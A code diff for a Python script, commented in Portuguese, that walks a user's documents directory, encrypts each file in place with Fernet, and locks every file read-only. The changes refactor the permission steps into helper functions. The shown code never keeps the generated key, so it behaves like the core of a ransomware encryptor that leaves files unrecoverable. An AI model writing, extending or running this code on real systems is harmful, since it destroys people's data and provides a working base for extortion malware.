@@ -5,8 +5,20 @@ from cryptography.fernet import Fernet
 def generate_key():
     return Fernet.generate_key()
 
+# Define permissões de edição para o arquivo
+def allow_edit(file_path):
+    os.chmod(file_path, 0o644)  # Permissões de leitura e escrita
+
+# Define permissões de leitura para o arquivo
+def set_read_only(file_path):
+    os.chmod(file_path, 0o444)  
+
 # Função para encriptar um arquivo
 def encrypt_file(filename, key):
+
+    # Define permissões de edição
+    allow_edit(filename)
+
     fernet = Fernet(key)  # Inicializa um objeto Fernet com a chave fornecida
     # Lê os dados do arquivo original, encripta os dados e escreve os dados encriptados de volta no arquivo
     with open(filename, "rb") as file:
@@ -14,6 +26,9 @@ def encrypt_file(filename, key):
     encrypted_data = fernet.encrypt(original_data)
     with open(filename, "wb") as file:
         file.write(encrypted_data)  
+
+    # Define permissões de leitura
+    set_read_only(filename)
 
 # Função para encriptar todos os arquivos na diretoria documents
 def encrypt_documents_directory():
@@ -26,5 +41,3 @@ def encrypt_documents_directory():
         for file in files:
             file_path = os.path.join(root, file)  # Obtém o caminho completo do arquivo
             encrypt_file(file_path, key)  # Encripta o arquivo
-            # Define as permissões do arquivo como somente leitura para o usuário
-            os.chmod(file_path, 0o444)  # 0o444 representa permissões de leitura para todos os usuários
